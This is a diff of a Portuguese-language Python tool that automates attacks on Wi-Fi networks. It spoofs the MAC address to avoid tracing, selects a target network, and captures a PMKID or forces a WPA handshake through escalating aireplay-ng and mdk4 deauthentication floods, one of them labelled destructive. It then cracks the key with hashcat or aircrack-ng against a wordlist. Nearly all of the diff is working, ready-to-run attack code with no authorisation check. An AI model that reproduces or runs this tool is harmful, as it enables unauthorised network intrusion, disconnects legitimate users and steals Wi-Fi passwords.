@@ -33,7 +33,7 @@ def print_banner():
 [bold magenta]╚═════╝ ╚══════╝╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝[/bold magenta]
 [bold white]       A U D I T O R I A   A V A N Ç A D A     [/bold white]
     """
-    console.print(Panel(banner, title="[bold green]EXPERT SYSTEM ONLINE[/bold green]", border_style="cyan", padding=(1, 2)))
+    console.print(Panel(banner, title="[bold green]MAGISTRADO SYSTEM ONLINE[/bold green]", border_style="cyan", padding=(1, 2)))
 
 def run_command(command, sudo=False, capture_output=True, text=True):
     if sudo:
@@ -45,8 +45,8 @@ def run_command(command, sudo=False, capture_output=True, text=True):
         return None, e.stderr.strip()
 
 def check_aircrack_ng():
-    with console.status("[bold yellow]Verificando integridade das ferramentas de ataque...", spinner="bouncingBar"):
-        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools"]
+    with console.status("[bold yellow]Verificando integridade do arsenal Magistrado (Aircrack, Hcx, MDK4, Macchanger)...", spinner="bouncingBar"):
+        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger"]
         todas_instaladas = True
         
         for ferramenta in ferramentas:
@@ -58,20 +58,20 @@ def check_aircrack_ng():
                 todas_instaladas = False
 
     if todas_instaladas:
-        console.print("[bold green] [✔] Arsenal de Hacking: Carregado e Operacional.[/bold green]")
+        console.print("[bold green] [✔] Arsenal Magistrado: Carregado e Operacional.[/bold green]")
         return True
 
-    if Confirm.ask("[bold yellow]Dependências ausentes. Deseja iniciar a instalação militar agora?[/bold yellow]"):
-        with console.status("[bold cyan]Baixando e instalando arsenal no núcleo do sistema...", spinner="dots2"):
-            stdout, stderr = run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools", sudo=True)
+    if Confirm.ask("[bold yellow]Arsenal incompleto. Deseja baixar os componentes Magistrado agora?[/bold yellow]"):
+        with console.status("[bold cyan]Baixando e instalando componentes avançados (MDK4 + Macchanger)...", spinner="dots2"):
+            stdout, stderr = run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger", sudo=True)
             if stdout:
-                 console.print("[bold green] [✔] Instalação concluída com êxito.[/bold green]")
+                 console.print("[bold green] [✔] Arsenal atualizado com êxito.[/bold green]")
                  return True
             else:
                  console.print(Panel(f"[bold red]Falha crítica na instalação:\n{stderr}[/bold red]", title="ERRO APT"))
                  return False
     else:
-        console.print("[bold red] [X] Operação abortada por falta de ferramentas.[/bold red]")
+        console.print("[bold red] [X] Operação abortada por falta de arsenal avançado.[/bold red]")
         return False
 
 def show_manual():
@@ -104,7 +104,7 @@ def save_networks_log(networks):
         with open(log_file, "w", encoding="utf-8") as f:
             json.dump(todas_sessoes, f, indent=4, ensure_ascii=False)
     except Exception as e:
-        pass # Falha silenciosa no log
+        pass
 
 def get_wifi_interface():
     with console.status("[bold cyan]Analisando hardware de rede...", spinner="point"):
@@ -128,21 +128,24 @@ def get_wifi_interface():
         return None
 
 def set_monitor_mode(interface):
-    # Verificação inteligente: Se já estiver em modo monitor, não faz nada
+    # Verificação inteligente
     stdout_check, _ = run_command(f"iw dev {interface} info")
     if stdout_check and "type monitor" in stdout_check:
-        console.print(f"[bold green] [✔] Interface {interface} já está em Modo Monitor. Pulando preparação.[/bold green]")
+        console.print(f"[bold green] [✔] Interface {interface} já está em Modo Monitor.[/bold green]")
         return interface
 
-    console.print(f"\n[bold yellow][PHD LEVEL][/bold yellow] Isolando kernel e armando a interface [bold cyan]{interface}[/bold cyan]...")
-    with console.status("[bold red]Desativando bloqueios (rfkill) e processos conflitantes...", spinner="bouncingBar"):
+    console.print(f"\n[bold yellow][MAGISTRADO LEVEL][/bold yellow] Blindagem de Kernel e Injeção de Identidade Falsa...")
+    with console.status("[bold red]Desativando bloqueios e camuflando endereço MAC...", spinner="bouncingBar"):
         run_command("rfkill unblock all", sudo=True)
         run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
         run_command("airmon-ng check kill", sudo=True)
-        # Limpa interfaces virtuais antigas que podem estar presas
+        run_command(f"ip link set {interface} down", sudo=True)
+        # Camuflagem Expert: Muda o MAC para um aleatório para evitar banimento ou rastreio
+        run_command(f"macchanger -r {interface}", sudo=True)
+        run_command(f"ip link set {interface} up", sudo=True)
         run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)
 
-    with console.status("[bold cyan]Injetando driver de Monitoramento...", spinner="bouncingBar"):
+    with console.status("[bold cyan]Injetando driver de Monitoramento Avançado...", spinner="bouncingBar"):
         stdout, stderr = run_command(f"airmon-ng start {interface}", sudo=True)
         stdout_iw, _ = run_command("iw dev")
         
@@ -175,21 +178,15 @@ def set_monitor_mode(interface):
 def set_managed_mode(interface):
     console.print(f"\n[bold blue]>>> Restaurando o Sistema para Estado Civil...[/bold blue]")
     with console.status("[bold yellow]Desarmando placa e reiniciando serviços de rede críticos...", spinner="dots2"):
-        # Garante a remoção do modo monitor
         run_command(f"airmon-ng stop {interface}", sudo=True)
-        
-        # Tenta resetar a interface via comandos de baixo nível para garantir
         run_command(f"ip link set {interface} down", sudo=True)
+        run_command(f"macchanger -p {interface}", sudo=True) # Restaura o MAC original
         run_command(f"iw dev {interface} set type managed", sudo=True)
         run_command(f"ip link set {interface} up", sudo=True)
-        
-        # Reativa os bloqueios de rádio e os serviços na ordem correta
         run_command("rfkill unblock all", sudo=True)
         run_command("systemctl start wpa_supplicant", sudo=True)
         run_command("systemctl start NetworkManager", sudo=True)
         run_command("systemctl restart NetworkManager", sudo=True)
-        
-        # Força o NetworkManager a gerenciar as interfaces novamente
         run_command("nmcli networking off", sudo=True)
         time.sleep(1)
         run_command("nmcli networking on", sudo=True)
@@ -257,8 +254,8 @@ def scan_networks(monitor_interface):
     console.print(Panel(f"[bold cyan]Alvo Travado:[/bold cyan] {target['essid']} ({target['bssid']}) no Canal {target['channel']}", border_style="green"))
     
     console.print("\n[bold magenta]SELECIONE O VETOR DE ATAQUE DA OGIVA:[/bold magenta]")
-    console.print("  [1] [bold cyan]Ataque Deauth (Handshake)[/bold cyan] - Clássico. Requer dispositivos conectados à rede para derrubar.")
-    console.print("  [2] [bold red]Ataque PMKID (Clientless)[/bold red] - Expert. Ataca direto o núcleo do roteador. Não precisa de ninguém conectado.")
+    console.print("  [1] [bold cyan]Ataque Deauth Adaptativo (Handshake)[/bold cyan] - Aireplay + MDK4.")
+    console.print("  [2] [bold red]Ataque PMKID (Clientless)[/bold red] - Magistrado. Ataca o Roteador diretamente.")
     atk_choice = Prompt.ask("[bold yellow]Estratégia (1 ou 2)[/bold yellow]", choices=["1", "2"], default="1")
     
     target['attack_type'] = 'pmkid' if atk_choice == '2' else 'handshake'
@@ -271,9 +268,6 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
     hash_file = f"{output_file}_pmkid.16800"
     
     run_command(f"rm -f {pcapng_file} {hash_file}", sudo=True)
-    run_command(f"ip link set {monitor_interface} down", sudo=True)
-    run_command(f"iw dev {monitor_interface} set type monitor", sudo=True)
-    run_command(f"ip link set {monitor_interface} up", sudo=True)
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
     
     filtro_file = "alvo_filtro.txt"
@@ -282,28 +276,24 @@ def capture_pmkid(monitor_interface, bssid, channel, output_file):
     dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng_file} --filterlist_ap={filtro_file} --filtermode=2 --enable_status=1"
     
     with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
-        task = progress.add_task("Bomba Lógica Enviada. Aguardando falha criptográfica do Roteador...", total=30)
+        task = progress.add_task("Bomba Lógica Enviada. Aguardando falha criptográfica do Roteador...", total=45)
         proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-        for _ in range(30):
+        for _ in range(45):
             time.sleep(1)
             progress.update(task, advance=1)
         proc.terminate()
         
     os.remove(filtro_file)
 
-    console.print("\n[bold cyan]Analisando destroços criptográficos (Extração do Hash)...[/bold cyan]")
     if os.path.exists(pcapng_file):
         run_command(f"hcxpcapngtool -o {hash_file} {pcapng_file}")
         if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
-            console.print("[bold green] [✔] VITÓRIA PMKID! Hash extraído com sucesso da memória do Roteador.[/bold green]")
+            console.print("[bold green] [✔] VITÓRIA PMKID! Hash extraído com sucesso.[/bold green]")
             return hash_file
-        else:
-            console.print("[bold red] [X] Roteador invulnerável a PMKID ou sinal fraco.[/bold red]")
-            return None
     return None
 
 def capture_handshake(monitor_interface, bssid, channel, output_file):
-    console.print(Panel(f"[bold yellow]Iniciando Ataque Deauth Adaptativo no alvo {bssid}...[/bold yellow]", border_style="yellow"))
+    console.print(Panel(f"[bold yellow]Iniciando Ataque Deauth Magistrado no alvo {bssid}...[/bold yellow]", border_style="yellow"))
     
     os.system(f"rm -f {output_file}-01.*")
     run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
@@ -314,24 +304,27 @@ def capture_handshake(monitor_interface, bssid, channel, output_file):
     cap_file = f"{output_file}-01.cap"
     handshake_found = False
     
-    for attempt in range(1, 4):
-        console.print(f"\n[bold magenta]>>> ENGATILHANDO TENTATIVA {attempt}/3[/bold magenta]")
+    for attempt in range(1, 5):
+        console.print(f"\n[bold magenta]>>> MAGISTRADO: VETOR DE ATAQUE {attempt}/4[/bold magenta]")
         
         if attempt == 1:
-            deauth_cmd = f"sudo aireplay-ng -0 5 -a {bssid} {monitor_interface}"
-            console.print("[cyan][*] Injetando 5 pacotes de desautenticação (Nível Baixo)...[/cyan]")
+            deauth_cmd = f"sudo aireplay-ng -0 8 -a {bssid} {monitor_interface}"
+            console.print("[cyan][*] Aireplay: 8 pacotes Deauth direcionados...[/cyan]")
         elif attempt == 2:
-            deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
-            console.print("[cyan][*] Intensificando. Deauth Broadcast Massivo (Nível Médio)...[/cyan]")
+            deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} {monitor_interface}"
+            console.print("[cyan][*] Aireplay: Deauth Broadcast Massivo...[/cyan]")
+        elif attempt == 3:
+            deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
+            console.print("[bold yellow][*] MDK4: Flood de Desautenticação (Bypass Moderno)...[/bold yellow]")
         else:
-            deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} -D {monitor_interface}"
-            console.print("[bold red][*] FORÇA BRUTA MAC: Ignorando proteções, varredura destrutiva (Nível Máximo)...[/bold red]")
+            deauth_cmd = f"sudo mdk4 {monitor_interface} d -E {bssid}"
+            console.print("[bold red][*] MDK4 MODO DESTRUTIVO: Forçando reconexão em massa...[/bold red]")
 
-        subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        with Progress(SpinnerColumn("bouncingBar"), TextColumn("[bold yellow]Vigiando chaves criptográficas no ar... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
-            task = progress.add_task("", total=20)
-            for _ in range(20):
+        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Vigiando chaves no ar... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
+            task = progress.add_task("", total=25)
+            for _ in range(25):
                 time.sleep(1)
                 progress.update(task, advance=1)
                 if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
@@ -340,116 +333,82 @@ def capture_handshake(monitor_interface, bssid, channel, output_file):
                         handshake_found = True
                         break
         
+        deauth_proc.terminate()
+        run_command("killall mdk4", sudo=True)
         if handshake_found:
-            console.print(f"\n[bold green] [✔] HANDSHAKE CAPTURADO NA TENTATIVA {attempt}![/bold green]")
+            console.print(f"\n[bold green] [✔] HANDSHAKE CAPTURADO![/bold green]")
             break
 
     dump_proc.terminate()
-
-    if handshake_found:
-        return cap_file
-    else:
-        console.print("\n[bold red] [X] Todos os vetores de Deauth falharam. O alvo não liberou as chaves.[/bold red]")
-        return None
+    return cap_file if handshake_found else None
 
 def crack_hash(hash_file, wordlist_file, bssid=None):
     console.print(Panel(f"[bold red]CRACKING MODULE ATIVADO[/bold red]", border_style="red"))
-    
     if not os.path.exists(wordlist_file):
-        console.print(f"[bold red]Erro: O arsenal de senhas (Wordlist) '{wordlist_file}' não foi localizado no HD.[/bold red]")
+        console.print(f"[bold red]Erro: Wordlist '{wordlist_file}' não encontrada.[/bold red]")
         return
 
     if hash_file.endswith(".16800"):
-        console.print("[bold cyan][Expert] Matriz PMKID reconhecida. Acionando Hashcat...[/bold cyan]")
         crack_cmd = f"hashcat -m 16800 -a 0 -w 3 {hash_file} {wordlist_file}"
         if run_command("which hashcat", capture_output=True)[0] == "":
             crack_cmd = f"aircrack-ng -w {wordlist_file} {hash_file}"
     else:
         crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
         
-    console.print(f"[bold yellow]Comando balístico gerado:[/bold yellow] [dim]{crack_cmd}[/dim]")
-    console.print("[bold green]Iniciando força bruta. Isso pode demorar dias, horas ou segundos...[/bold green]\n")
-    
     try:
         subprocess.run(crack_cmd, shell=True)
     except KeyboardInterrupt:
-        console.print("\n[bold yellow]>>> Processo de Cracking Abortado Manualmente.[/bold yellow]")
+        console.print("\n[bold yellow]>>> Processo Abortado.[/bold yellow]")
 
 def main():
     if os.geteuid() != 0:
-        console.print(Panel("[bold red]ACESSO NEGADO: Este sistema de nível militar requer privilégios ROOT (sudo).[/bold red]"))
+        console.print(Panel("[bold red]ACESSO NEGADO: Requer privilégios ROOT.[/bold red]"))
         return
 
     while True:
         os.system("clear")
         print_banner()
-        console.print("\n[bold cyan]1.[/bold cyan] [white]Iniciar Incursão de Rede (Capturar/Quebrar)[/white]")
-        console.print("[bold cyan]2.[/bold cyan] [white]Acessar Banco de Dados e Manuais (Info)[/white]")
-        console.print("[bold cyan]3.[/bold cyan] [white]Desconectar Sistema (Sair)[/white]")
-        
-        opcao = Prompt.ask("\n[bold green]Comando de Ação[/bold green]", choices=["1", "2", "3"])
-        
-        if opcao == '2':
-            show_manual()
-            continue
-        elif opcao == '3':
-            console.print("[bold green]Sistemas encerrados. Conexão terminada.[/bold green]")
-            return
-        elif opcao == '1':
-            break
+        console.print("\n[bold cyan]1.[/bold cyan] [white]Iniciar Incursão Magistrada[/white]")
+        console.print("[bold cyan]2.[/bold cyan] [white]Acessar Info/Manuais[/white]")
+        console.print("[bold cyan]3.[/bold cyan] [white]Sair[/white]")
+        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3"])
+        if opcao == '2': show_manual(); continue
+        elif opcao == '3': return
+        elif opcao == '1': break
 
-    if not check_aircrack_ng():
-        return
-
+    if not check_aircrack_ng(): return
     interface = get_wifi_interface()
     if not interface: return
-
     monitor_interface = set_monitor_mode(interface)
     if not monitor_interface: return
 
     try:
         target_network = scan_networks(monitor_interface)
         if not target_network: return
-
-        capture_file_prefix = f"capture_{target_network['essid'].replace(' ', '_')}"
+        prefix = f"capture_{target_network['essid'].replace(' ', '_')}"
         cap_file = None
         
         if target_network['attack_type'] == 'pmkid':
-             cap_file = capture_pmkid(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)
+             cap_file = capture_pmkid(monitor_interface, target_network['bssid'], target_network['channel'], prefix)
+             if not cap_file:
+                  console.print("\n[bold yellow]Fallback: PMKID falhou. Iniciando Deauth...[/bold yellow]")
+                  cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], prefix)
         else:
-             cap_file_path = f"{capture_file_prefix}-01.cap"
-             handshake_existente = False
-             if os.path.exists(cap_file_path):
-                 stdout, _ = run_command(f"aircrack-ng {cap_file_path}")
-                 if "1 handshake" in stdout or "WPA (1 handshake)" in stdout:
-                     if Confirm.ask(f"\n[bold yellow]Handshake válido já existe em disco para {target_network['essid']}. Usar versão salva?[/bold yellow]"):
-                         handshake_existente = True
-                         cap_file = cap_file_path
-
-             if not handshake_existente:
-                  cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)
-
-        if not cap_file and target_network['attack_type'] == 'pmkid':
-             console.print("\n[bold yellow][PHD LEVEL] Roteador evadiu o ataque PMKID. Acionando Plano B (Fallback para Handshake Clássico)...[/bold yellow]")
-             cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], capture_file_prefix)
+             cap_file = capture_handshake(monitor_interface, target_network['bssid'], target_network['channel'], prefix)
 
         if not cap_file:
-             console.print(Panel("[bold red]Operação Fracassada. O alvo resistiu aos vetores de ataque.[/bold red]"))
+             console.print(Panel("[bold red]Falha: Alvo impenetrável no momento.[/bold red]"))
              return
              
-        console.print(f"\n[bold green]>>> Chave Criptográfica retida em: {cap_file}[/bold green]")
-        
-        wordlist = Prompt.ask("\n[bold yellow]Caminho da Wordlist para quebra (Ex: /usr/share/wordlists/rockyou.txt, deixe em branco para pular)[/bold yellow]")
-        if wordlist:
-            crack_hash(cap_file, wordlist, target_network['bssid'])
+        wordlist = Prompt.ask("\n[bold yellow]Caminho da Wordlist (ENTER para rockyou)[/bold yellow]", default="/usr/share/wordlists/rockyou.txt")
+        crack_hash(cap_file, wordlist, target_network['bssid'])
         
     except KeyboardInterrupt:
-        console.print("\n[bold red]>>> ABORTO DE EMERGÊNCIA SOLICITADO.[/bold red]")
+        console.print("\n[bold red]>>> ABORTO.[/bold red]")
     except Exception as e:
-        console.print(f"\n[bold red][!] ERRO CRÍTICO: {e}[/bold red]")
+        console.print(f"\n[bold red][!] ERRO: {e}[/bold red]")
     finally:
         set_managed_mode(monitor_interface)
-        console.print("\n[bold green]>>> SISTEMA SEGURO. RETORNANDO AO TERMINAL.[/bold green]\n")
 
 if __name__ == "__main__":
     main()
